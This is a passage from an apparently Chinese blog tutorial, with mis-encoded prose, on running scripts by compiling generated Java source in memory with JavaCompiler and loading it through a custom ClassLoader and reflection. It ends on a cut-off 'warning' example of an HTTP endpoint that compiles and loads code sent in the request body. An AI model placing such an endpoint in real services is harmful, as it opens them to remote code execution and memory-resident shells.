        sb.append(<span class="hljs-string">"        "</span>).append(type).append(<span class="hljs-string">" "</span>).append(varName)
          .append(<span class="hljs-string">" = ("</span>).append(type).append(<span class="hljs-string">") context.get(\""</span>)
          .append(varName).append(<span class="hljs-string">"\");\n"</span>);
    }
    
    <span class="hljs-comment">// æ³¨å…¥å‡½æ•°ç±»</span>
    <span class="hljs-keyword">for</span> (String funcName : context.getFunctions().keySet()) {
        sb.append(<span class="hljs-string">"        Class&lt;?&gt; "</span>).append(funcName)
          .append(<span class="hljs-string">" = functions.get(\""</span>).append(funcName).append(<span class="hljs-string">"\");\n"</span>);
    }
    
    <span class="hljs-comment">// è½¬æ¢å¹¶æ’å…¥è„šæœ¬</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">transformedScript</span> <span class="hljs-operator">=</span> transformScript(script);
    sb.append(<span class="hljs-string">"        return "</span>).append(transformedScript).append(<span class="hljs-string">";\n"</span>);
    
    sb.append(<span class="hljs-string">"    }\n"</span>);
    sb.append(<span class="hljs-string">"}\n"</span>);
    
    <span class="hljs-keyword">return</span> sb.toString();
}
</code></pre>
<h3 data-id="heading-4">æŠ€æœ¯ç‚¹äºŒï¼šå‡½æ•°è°ƒç”¨è½¬æ¢</h3>
<p><strong>é—®é¢˜</strong>ï¼šè„šæœ¬é‡Œæ€ä¹ˆè°ƒç”¨ MyMath.discountï¼Ÿ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è„šæœ¬ä¸­</span>
MyMath.discount(<span class="hljs-number">100</span>, <span class="hljs-number">0.8</span>)

<span class="hljs-comment">// ä½†æ­¤æ—¶ MyMath æ˜¯ Class&lt;?&gt; ç±»å‹</span>
Class&lt;?&gt; MyMath = functions.get(<span class="hljs-string">"MyMath"</span>);

<span class="hljs-comment">// ä¸èƒ½ç›´æ¥è°ƒç”¨æ–¹æ³•</span>
MyMath.discount(<span class="hljs-number">100</span>, <span class="hljs-number">0.8</span>);  <span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè½¬æ¢æˆåå°„è°ƒç”¨</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è½¬æ¢å</span>
(Double) MyMath.getMethod(<span class="hljs-string">"discount"</span>, <span class="hljs-type">double</span>.class, <span class="hljs-type">double</span>.class)
               .invoke(<span class="hljs-literal">null</span>, <span class="hljs-number">100.0</span>, <span class="hljs-number">0.8</span>)
</code></pre>
<p><strong>è½¬æ¢é€»è¾‘</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">transformFunctionCalls</span><span class="hljs-params">(String script)</span> {
    <span class="hljs-comment">// æ­£åˆ™åŒ¹é…ï¼šClassName.methodName(args)</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> <span class="hljs-string">"(\\w+)\\.(\\w+)\\(([^)]*)\\)"</span>;
    <span class="hljs-type">Pattern</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Pattern.compile(pattern);
    <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> p.matcher(script);
    
    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();
    <span class="hljs-keyword">while</span> (m.find()) {
        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);   <span class="hljs-comment">// MyMath</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">2</span>);  <span class="hljs-comment">// discount</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">args</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">3</span>);        <span class="hljs-comment">// 100, 0.8</span>
        
        String[] argArray = args.split(<span class="hljs-string">","</span>);
        
        <span class="hljs-comment">// æ„é€ åå°„è°ƒç”¨</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">repl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        repl.append(<span class="hljs-string">"(Double) "</span>).append(className)
            .append(<span class="hljs-string">".getMethod(\""</span>).append(methodName).append(<span class="hljs-string">"\""</span>);
        
        <span class="hljs-comment">// æ·»åŠ å‚æ•°ç±»å‹</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; argArray.length; i++) {
            repl.append(<span class="hljs-string">", double.class"</span>);
        }
        
        repl.append(<span class="hljs-string">").invoke(null, "</span>).append(args).append(<span class="hljs-string">")"</span>);
        
        m.appendReplacement(result, repl.toString());
    }
    m.appendTail(result);
    
    <span class="hljs-keyword">return</span> result.toString();
}
</code></pre>
<h3 data-id="heading-5">æŠ€æœ¯ç‚¹ä¸‰ï¼šJavaCompiler åŠ¨æ€ç¼–è¯‘</h3>
<p><strong>æ ¸å¿ƒ API</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–ç³»ç»Ÿç¼–è¯‘å™¨ï¼ˆéœ€è¦ JDKï¼ŒJRE æ²¡æœ‰ï¼‰</span>
<span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();

<span class="hljs-keyword">if</span> (compiler == <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"éœ€è¦ JDKï¼Œä¸èƒ½ç”¨ JRE"</span>);
}
</code></pre>
<p><strong>ç¼–è¯‘å››æ­¥éª¤</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[Javaæºç ] --&gt;|åŒ…è£…| B[JavaFileObject]
    B --&gt;|ç¼–è¯‘| C[å†…å­˜å­—èŠ‚ç ]
    C --&gt;|æ£€æŸ¥| D{æ˜¯å¦æˆåŠŸ}
    D --&gt;|æ˜¯| E[è¿”å›å­—èŠ‚ç ]
    D --&gt;|å¦| F[æŠ›å¼‚å¸¸]
    
    style A fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style B fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style C fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style D fill:#ffccbc,stroke:#e64a19,stroke-width:2px
    style E fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
    style F fill:#ffebee,stroke:#b71c1c,stroke-width:2px
</code></pre>
<p><strong>å…³é”®ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] compile(String className, String javaSource) <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 1. è·å–ç¼–è¯‘å™¨</span>
    <span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();
    
    <span class="hljs-comment">// 2. è¯Šæ–­æ”¶é›†å™¨ï¼ˆæ”¶é›†ç¼–è¯‘é”™è¯¯ï¼‰</span>
    DiagnosticCollector&lt;JavaFileObject&gt; diagnostics = 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">DiagnosticCollector</span>&lt;&gt;();
    
    <span class="hljs-comment">// 3. æ–‡ä»¶ç®¡ç†å™¨ï¼ˆæ‹¦æˆªè¾“å‡ºåˆ°å†…å­˜ï¼‰</span>
    <span class="hljs-type">InMemoryFileManager</span> <span class="hljs-variable">fileManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryFileManager</span>(
        compiler.getStandardFileManager(diagnostics, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)
    );
    
    <span class="hljs-comment">// 4. æºç å¯¹è±¡</span>
    <span class="hljs-type">JavaFileObject</span> <span class="hljs-variable">sourceFile</span> <span class="hljs-operator">=</span> 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringSourceJavaFileObject</span>(className, javaSource);
    
    <span class="hljs-comment">// 5. ç¼–è¯‘ä»»åŠ¡</span>
    Iterable&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JavaFileObject</span>&gt; compilationUnits = 
        Arrays.asList(sourceFile);
    
    JavaCompiler.<span class="hljs-type">CompilationTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> compiler.getTask(
        <span class="hljs-literal">null</span>,                    <span class="hljs-comment">// è¾“å‡ºï¼ˆnull = ä¸è¾“å‡ºï¼‰</span>
        fileManager,             <span class="hljs-comment">// æ–‡ä»¶ç®¡ç†å™¨</span>
        diagnostics,             <span class="hljs-comment">// è¯Šæ–­æ”¶é›†å™¨</span>
        <span class="hljs-literal">null</span>,                    <span class="hljs-comment">// ç¼–è¯‘é€‰é¡¹</span>
        <span class="hljs-literal">null</span>,                    <span class="hljs-comment">// æ³¨è§£å¤„ç†å™¨</span>
        compilationUnits         <span class="hljs-comment">// æºæ–‡ä»¶</span>
    );
    
    <span class="hljs-comment">// 6. æ‰§è¡Œç¼–è¯‘</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> task.call();
    
    <span class="hljs-keyword">if</span> (!success) {
        <span class="hljs-comment">// æ”¶é›†é”™è¯¯</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">errors</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (Diagnostic&lt;?&gt; d : diagnostics.getDiagnostics()) {
            errors.append(d.getMessage(<span class="hljs-literal">null</span>)).append(<span class="hljs-string">"\n"</span>);
        }
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"ç¼–è¯‘å¤±è´¥:\n"</span> + errors);
    }
    
    <span class="hljs-comment">// 7. è·å–å­—èŠ‚ç </span>
    <span class="hljs-keyword">return</span> fileManager.getCompiledClass(className);
}
</code></pre>
<h3 data-id="heading-6">æŠ€æœ¯ç‚¹å››ï¼šå†…å­˜ç¼–è¯‘ï¼ˆä¸å†™ç£ç›˜ï¼‰</h3>
<p><strong>é—®é¢˜</strong>ï¼šJavaCompiler é»˜è®¤ä¼šæŠŠ .class å†™åˆ°ç£ç›˜</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é»˜è®¤è¡Œä¸º</span>
javac Script_123.java
<span class="hljs-comment"># ç”Ÿæˆ Script_123.class æ–‡ä»¶</span>
</code></pre>
<p><strong>ç›®æ ‡</strong>ï¼šç¼–è¯‘åçš„å­—èŠ‚ç ä¿å­˜åœ¨å†…å­˜ï¼Œä¸å†™ç£ç›˜</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè‡ªå®šä¹‰ FileManager æ‹¦æˆªè¾“å‡º</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç¼–è¯‘å™¨è¦å†™.class] --&gt;|æ‹¦æˆª| B[FileManager]
    B --&gt;|æ”¹å†™åˆ°| C[å†…å­˜å¯¹è±¡]
    C --&gt;|ä¿å­˜| D[ByteArrayOutputStream]
    
    style A fill:#ffccbc,stroke:#e64a19,stroke-width:2px
    style B fill:#fff9c4,stroke:#f57f17,stroke-width:3px
    style C fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style D fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
</code></pre>
<p><strong>æ ¸å¿ƒåŸç†</strong>ï¼š</p>
<p>ç¼–è¯‘å™¨è°ƒç”¨ <code>getJavaFileForOutput()</code> æ—¶ï¼Œæˆ‘ä»¬è¿”å›è‡ªå·±çš„å†…å­˜å¯¹è±¡ï¼Œè€Œä¸æ˜¯çœŸå®æ–‡ä»¶ã€‚ç¼–è¯‘å™¨ä¼šæŠŠå­—èŠ‚ç å†™åˆ°è¿™ä¸ªå†…å­˜å¯¹è±¡é‡Œã€‚</p>
<p><strong>å…³é”®ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InMemoryFileManager</span> 
    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ForwardingJavaFileManager</span>&lt;JavaFileManager&gt; {
    
    <span class="hljs-comment">// ä¿å­˜ç¼–è¯‘åçš„å­—èŠ‚ç </span>
    <span class="hljs-keyword">private</span> Map&lt;String, ByteArrayJavaFileObject&gt; compiledClasses = 
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> JavaFileObject <span class="hljs-title function_">getJavaFileForOutput</span><span class="hljs-params">(
        Location location,
        String className,
        JavaFileObject.Kind kind,
        FileObject sibling
    )</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-keyword">if</span> (kind == JavaFileObject.Kind.CLASS) {
            <span class="hljs-comment">// æ‹¦æˆª .class è¾“å‡º</span>
            <span class="hljs-type">ByteArrayJavaFileObject</span> <span class="hljs-variable">fileObject</span> <span class="hljs-operator">=</span> 
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayJavaFileObject</span>(className);
            compiledClasses.put(className, fileObject);
            <span class="hljs-keyword">return</span> fileObject;  <span class="hljs-comment">// è¿”å›å†…å­˜å¯¹è±¡</span>
        }
        
        <span class="hljs-comment">// å…¶ä»–ç±»å‹äº¤ç»™çˆ¶ç±»å¤„ç†</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.getJavaFileForOutput(location, className, kind, sibling);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getCompiledClass(String className) {
        <span class="hljs-type">ByteArrayJavaFileObject</span> <span class="hljs-variable">fileObject</span> <span class="hljs-operator">=</span> compiledClasses.get(className);
        <span class="hljs-keyword">return</span> fileObject != <span class="hljs-literal">null</span> ? fileObject.getBytes() : <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>ByteArrayJavaFileObject</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ByteArrayJavaFileObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleJavaFileObject</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ByteArrayJavaFileObject</span><span class="hljs-params">(String className)</span> {
        <span class="hljs-built_in">super</span>(
            URI.create(<span class="hljs-string">"bytes:///"</span> + className.replace(<span class="hljs-string">'.'</span>, <span class="hljs-string">'/'</span>) + <span class="hljs-string">".class"</span>),
            Kind.CLASS
        );
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> OutputStream <span class="hljs-title function_">openOutputStream</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> baos;  <span class="hljs-comment">// ç¼–è¯‘å™¨å†™å…¥è¿™é‡Œï¼Œä»å†…å­˜åŠ è½½å­—èŠ‚ç ï¼Œç»•è¿‡ç£ç›˜IO</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getBytes() {
        <span class="hljs-keyword">return</span> baos.toByteArray();  <span class="hljs-comment">// è·å–å­—èŠ‚ç </span>
    }
}
</code></pre>
<h3 data-id="heading-7">æŠ€æœ¯ç‚¹äº”ï¼šè‡ªå®šä¹‰ ClassLoader åŠ è½½</h3>
<p><strong>é—®é¢˜</strong>ï¼šæœ‰äº†å­—èŠ‚ç ï¼Œæ€ä¹ˆåŠ è½½æˆ Class å¯¹è±¡ï¼Ÿ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">byte</span>[] classBytes = compiler.compile(className, javaSource);
<span class="hljs-comment">// æ€ä¹ˆå˜æˆ Class&lt;?&gt; å¯¹è±¡ï¼Ÿ</span>
</code></pre>
<p><strong>ç­”æ¡ˆ</strong>ï¼šè‡ªå®šä¹‰ ClassLoader</p>
<p><strong>æ ¸å¿ƒæ–¹æ³•</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// defineClassï¼šå­—èŠ‚ç æ•°ç»„ â†’ Class å¯¹è±¡</span>
Class&lt;?&gt; clazz = defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);
</code></pre>
<p><strong>åŒäº²å§”æ´¾æœºåˆ¶</strong>ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">å…ˆé—®çˆ¶ç±»èƒ½ä¸èƒ½åŠ è½½
  â†“ ä¸èƒ½
å†è°ƒç”¨è‡ªå·±çš„ findClass
  â†“
ä»å†…å­˜å­—èŠ‚ç æ•°ç»„åŠ è½½
  â†“
è¿”å› <span class="hljs-keyword">Class</span> å¯¹è±¡
</code></pre>
<p><strong>å…³é”®ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScriptClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> {
    
    <span class="hljs-comment">// å­˜å‚¨å­—èŠ‚ç </span>
    <span class="hljs-keyword">private</span> Map&lt;String, <span class="hljs-type">byte</span>[]&gt; classBytesMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ScriptClassLoader</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>(ScriptClassLoader.class.getClassLoader());  <span class="hljs-comment">// è®¾ç½®çˆ¶ç±»åŠ è½½å™¨</span>
    }
    
    <span class="hljs-comment">// æ³¨å†Œå­—èŠ‚ç </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineClass</span><span class="hljs-params">(String className, <span class="hljs-type">byte</span>[] classBytes)</span> {
        classBytesMap.put(className, classBytes);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException {
        <span class="hljs-comment">// ä»å†…å­˜è·å–å­—èŠ‚ç ï¼ˆJDK ç¼–è¯‘å™¨ SPI æ¥å£ç”Ÿæˆçš„ï¼‰</span>
        <span class="hljs-type">byte</span>[] classBytes = classBytesMap.get(name);
        
        <span class="hljs-keyword">if</span> (classBytes != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// defineClassï¼šä»å†…å­˜å­—èŠ‚æ•°ç»„åŠ è½½ï¼Œç»•è¿‡ç£ç›˜IO</span>
            <span class="hljs-keyword">return</span> defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ¯æ¬¡ç”Ÿæˆæ–°ç±»åï¼Ÿ</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Script_"</span> + System.currentTimeMillis();
</code></pre>
<p><strong>åŸå› </strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åŒä¸€ä¸ª ClassLoader ä¸èƒ½åŠ è½½åŒåç±»
<span class="hljs-bullet">2.</span> é‡å¤åŠ è½½ä¼šæŠ¥é”™ï¼šLinkageError

è§£å†³æ–¹æ¡ˆï¼š
<span class="hljs-bullet">-</span> æ–¹æ¡ˆ1ï¼šæ¯æ¬¡ç”Ÿæˆæ–°ç±»åï¼ˆå½“å‰åšæ³•ï¼‰
<span class="hljs-bullet">-</span> æ–¹æ¡ˆ2ï¼šæ¯æ¬¡åˆ›å»ºæ–° ClassLoader
<span class="hljs-bullet">-</span> æ–¹æ¡ˆ3ï¼šç¼“å­˜ï¼ˆç›¸åŒè„šæœ¬å¤ç”¨ Classï¼‰
</code></pre>
<h3 data-id="heading-8">æŠ€æœ¯ç‚¹å…­ï¼šåå°„æ‰§è¡Œ</h3>
<p><strong>é—®é¢˜</strong>ï¼šæœ‰äº† Class å¯¹è±¡ï¼Œæ€ä¹ˆæ‰§è¡Œï¼Ÿ</p>
<pre><code class="hljs language-java" lang="java">Class&lt;?&gt; scriptClass = loader.loadClass(<span class="hljs-string">"Script_1702345678"</span>);
<span class="hljs-comment">// æ€ä¹ˆè°ƒç”¨ execute æ–¹æ³•ï¼Ÿ</span>
</code></pre>
<p><strong>ç­”æ¡ˆ</strong>ï¼šåå°„</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. è·å– execute æ–¹æ³•</span>
<span class="hljs-type">Method</span> <span class="hljs-variable">executeMethod</span> <span class="hljs-operator">=</span> scriptClass.getMethod(
    <span class="hljs-string">"execute"</span>, 
    Map.class,    <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå‚æ•°ï¼šcontext</span>
    Map.class     <span class="hljs-comment">// ç¬¬äºŒä¸ªå‚æ•°ï¼šfunctions</span>
);

<span class="hljs-comment">// 2. å‡†å¤‡å‚æ•°</span>
Map&lt;String, Object&gt; context = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
context.put(<span class="hljs-string">"amount"</span>, <span class="hljs-number">150.0</span>);

Map&lt;String, Class&lt;?&gt;&gt; functions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
functions.put(<span class="hljs-string">"MyMath"</span>, MyMath.class);

<span class="hljs-comment">// 3. è°ƒç”¨ï¼ˆé™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼  nullï¼‰</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> executeMethod.invoke(
    <span class="hljs-literal">null</span>,        <span class="hljs-comment">// é™æ€æ–¹æ³•</span>
    context,     <span class="hljs-comment">// ç¬¬ä¸€ä¸ªå‚æ•°</span>
    functions    <span class="hljs-comment">// ç¬¬äºŒä¸ªå‚æ•°</span>
);

<span class="hljs-comment">// 4. è¿”å›ç»“æœ</span>
<span class="hljs-keyword">return</span> result;  <span class="hljs-comment">// 120.0</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">å››ã€å®Œæ•´æ‰§è¡Œæµç¨‹ç¤ºä¾‹</h2>
<p><strong>è¾“å…¥</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if (amount &gt; 100) MyMath.discount(amount, 0.8)"</span>;
Context:
  amount = <span class="hljs-number">150.0</span>
  MyMath = MyMath.class
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[è„šæœ¬å­—ç¬¦ä¸²] --&gt; B[åŒ…è£…æˆJavaæºç ]
    B --&gt; C[JavaCompilerç¼–è¯‘]
    C --&gt; D[å¾—åˆ°å†…å­˜å­—èŠ‚ç ]
    D --&gt; E[ClassLoaderåŠ è½½]
    E --&gt; F[åå°„æ‰§è¡Œ]
    F --&gt; G[è¿”å›ç»“æœ]
    
    style A fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style B fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style C fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style D fill:#ffccbc,stroke:#e64a19,stroke-width:2px
    style E fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
    style F fill:#ffebee,stroke:#c62828,stroke-width:2px
    style G fill:#e8f5e9,stroke:#1b5e20,stroke-width:3px
</code></pre>
<p><strong>ç”Ÿæˆçš„ Java æºç </strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Script_1702345678</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(
        java.util.Map&lt;String, Object&gt; context,
        java.util.Map&lt;String, Class&lt;?&gt;&gt; functions
    )</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Double</span> <span class="hljs-variable">amount</span> <span class="hljs-operator">=</span> (Double) context.get(<span class="hljs-string">"amount"</span>);
        Class&lt;?&gt; MyMath = functions.get(<span class="hljs-string">"MyMath"</span>);
        
        <span class="hljs-keyword">return</span> (amount &gt; <span class="hljs-number">100</span>) ? 
            (Double) MyMath.getMethod(<span class="hljs-string">"discount"</span>, <span class="hljs-type">double</span>.class, <span class="hljs-type">double</span>.class)
                           .invoke(<span class="hljs-literal">null</span>, amount, <span class="hljs-number">0.8</span>)
            : <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>ç¼–è¯‘åçš„å­—èŠ‚ç æŒ‡ä»¤</strong>ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">executeæ–¹æ³•:
  ALOAD context
  LDC <span class="hljs-string">"amount"</span>
  INVOKEINTERFACE <span class="hljs-keyword">get</span>
  CHECKCAST <span class="hljs-type">Double</span>
  ASTORE amount
  
  ALOAD amount
  INVOKEVIRTUAL doubleValue
  LDC <span class="hljs-number">100.0</span>
  DCMPG
  IFLE label_else       â† çœŸæ­£çš„ JVM <span class="hljs-keyword">if</span> æŒ‡ä»¤ï¼
  
  ALOAD MyMath
  LDC <span class="hljs-string">"discount"</span>
  ...
  INVOKEVIRTUAL invoke
  <span class="hljs-keyword">GOTO</span> label_end
  
<span class="hljs-symbol">label_else:</span>
  ACONST_NULL
  
<span class="hljs-symbol">label_end:</span>
  ARETURN
</code></pre>
<p><strong>å…³é”®å¯¹æ¯”</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">QLExpress</span>ï¼š
  ç”¨ <span class="hljs-title class_">Java</span> çš„ <span class="hljs-keyword">if</span> åŒ…è£…ï¼š<span class="hljs-keyword">if</span> ((<span class="hljs-title class_">Boolean</span>) cond) { ... }
  
<span class="hljs-title class_">MiniGroovy</span>ï¼š
  ç”Ÿæˆ <span class="hljs-variable constant_">JVM</span> çš„ <span class="hljs-keyword">if</span> æŒ‡ä»¤ï¼š<span class="hljs-variable constant_">IFLE</span> label_else
</code></pre>
<hr/>
<h2 data-id="heading-10">äº”ã€ä¸ QLExpress çš„å¯¹æ¯”</h2>
<p>ä¸æ·±å…¥å¯¹æ¯”ï¼ˆä¸‹ä¸€ç¯‡æ–‡ç« çš„äº‹ï¼‰ï¼Œç®€å•è¯´å‡ ç‚¹å·®å¼‚ï¼š</p>



































<table><thead><tr><th>ç»´åº¦</th><th>QLExpress</th><th>DynamicScriptRunner</th></tr></thead><tbody><tr><td>if è¯­å¥</td><td>Java ä»£ç æ¨¡æ‹Ÿ</td><td>JVM å­—èŠ‚ç æŒ‡ä»¤</td></tr><tr><td>ç”Ÿæˆ class</td><td>ä¸ç”Ÿæˆ</td><td>ç”Ÿæˆ</td></tr><tr><td>å¯åŠ¨é€Ÿåº¦</td><td>å¿«</td><td>æ…¢ï¼ˆç¼–è¯‘è€—æ—¶ï¼‰</td></tr><tr><td>è¿è¡Œé€Ÿåº¦</td><td>æ…¢</td><td>å¿«ï¼ˆJIT ä¼˜åŒ–ï¼‰</td></tr><tr><td>å†…å­˜å ç”¨</td><td>ä½</td><td>é«˜ï¼ˆæ¯æ¬¡ç”Ÿæˆæ–°ç±»ï¼‰</td></tr></tbody></table>
<p><strong>æ ¸å¿ƒå·®å¼‚</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">QLExpressï¼š
  è„šæœ¬ â†’ AST â†’ ç”¨ Java ä»£ç éå†æ‰§è¡Œ
  
DynamicScriptRunnerï¼š
  è„šæœ¬ â†’ Java æºç  â†’ ç¼–è¯‘æˆ <span class="hljs-keyword">class</span> â†’ JVM æ‰§è¡Œ
</code></pre>
<hr/>
<h2 data-id="heading-11">å…­ã€é»‘ç§‘æŠ€ä¸è­¦å‘Š</h2>
<h3 data-id="heading-12">é»‘ç§‘æŠ€ï¼šåŠ¨æ€åŠ è½½ Controller</h3>
<p>ç†è®ºä¸Šï¼Œå¯ä»¥ç”¨è¿™ä¸ªæŠ€æœ¯åŠ¨æ€åŠ è½½ Controllerï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å†™ä¸€ä¸ª HTTP æ¥å£æ¥æ”¶ä»£ç </span>
<span class="hljs-meta">@PostMapping("/dynamicController")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">addController</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String code)</span> {
    <span class="hljs-comment">// ç¼–è¯‘ä»£ç </span>
    <span class="hljs-type">byte</span>[] classBytes = compiler.compile(<span class="hljs-string">"DynamicController"</span>, code);
    
    <span class="hljs-comment">// åŠ è½½ç±»</span>
